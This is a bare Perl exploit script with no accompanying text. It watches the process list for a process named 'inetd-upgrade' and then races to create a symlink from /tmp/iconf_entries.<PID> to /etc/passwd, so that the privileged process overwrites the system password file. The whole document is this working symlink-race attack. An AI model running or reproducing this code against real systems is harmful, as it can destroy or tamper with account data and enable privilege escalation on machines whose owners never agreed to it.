#!/usr/bin/perl 
$clobber = "/etc/passwd";
while(1) {
open ps,"ps -ef | grep -v grep |grep -v PID |";

while(<ps>) {
@args = split " ", $_;

if (/inetd-upgrade/) { 
        print "Symlinking iconf_entries.$args[1] to  $clobber\n";
        symlink($clobber,"/tmp/iconf_entries.$args[1]");
        exit(1);
   }
 }

}
